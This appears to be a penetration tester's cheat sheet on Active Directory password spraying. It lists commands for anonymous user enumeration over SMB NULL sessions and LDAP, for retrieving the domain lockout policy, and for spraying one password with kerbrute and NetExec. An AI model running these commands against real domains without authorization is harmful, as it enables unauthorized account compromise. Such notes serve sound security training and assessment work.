**Overview:**
- Password spraying attempts a single common password against a large list of valid usernames, avoiding lockout by staying under the threshold. Requires knowing the domain password policy before attempting.
- SMB NULL sessions and LDAP anonymous binds are legacy misconfigurations that expose user lists and password policy to unauthenticated attackers.
- Default domain password policy sets lockout threshold to 0 (disabled), but never assume this. Always enumerate policy first to avoid locking out accounts.
- Valid user lists can be sourced from SMB NULL sessions, LDAP anonymous binds, Kerbrute enumeration, LinkedIn scraping, or hashes captured via Responder.

## Default Password Policy

|Policy|Default Value|
|---|---|
|Enforce password history|24 days|
|Maximum password age|42 days|
|Minimum password age|1 day|
|Minimum password length|7|
|Complexity requirements|Enabled|
|Reversible encryption|Disabled|
|Account lockout duration|Not set|
|Account lockout threshold|0|
|Reset lockout counter after|Not set|

---
## User Enumeration

```
rpcclient -U "" -N <dc-ip>
```

Connect anonymously via SMB NULL session. Run `enumdomusers` inside the session to dump the full user list, `querydominfo` to retrieve domain info.

```
enum4linux -U <dc-ip> | grep "user:"
```

Enumerate users via SMB NULL session and filter output to usernames only.

```
nxc smb <dc-ip> --users
```

Enumerate domain users via NetExec without credentials.

```
./windapsearch.py --dc-ip <dc-ip> -u "" -U
```

Query LDAP anonymously to retrieve the user list. `-u ""` specifies anonymous access, `-U` retrieves users only. LDAP anonymous binds are disabled by default since Windows Server 2003 but still appear in legacy environments.

```
ldapsearch -h <dc-ip> -x -b "DC=<domain>,DC=<tld>" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Raw LDAP anonymous query. Useful when windapsearch is unavailable or for manual inspection of attributes.

---
## Password Policy Enumeration

**Linux:**

```
enum4linux -P <dc-ip>
```

Enumerate password policy via SMB NULL session. Use before spraying to determine lockout threshold.

```
nxc smb <dc-ip> -u <user> -p <password> --pass-pol
```

Retrieve password policy with valid credentials via NetExec. `--pass-pol` pulls lockout threshold, duration, and minimum password length.

> Run on the Windows target

```
net accounts
```

Retrieve the domain password policy from a domain-joined Windows host. No additional tools required.

```
net use \\<dc>\ipc$ "" /u:""
```

Establish an anonymous SMB NULL session from a Windows host. Used as a prerequisite for further enumeration via Windows-based tools.

---
## Password Spraying

```
kerbrute passwordspray -d <domain> --dc <dc-ip> <valid-users-file> <password>
```

Spray a single password against a validated user list via Kerberos. Generates less noise than SMB-based spraying. `-d` specifies the domain, `--dc` specifies the domain controller IP.

```
sudo nxc smb <dc-ip> -u <valid-users-file> -p <password> | grep +
```

Spray via SMB from a Linux host. `grep +` filters output to successful authentications only.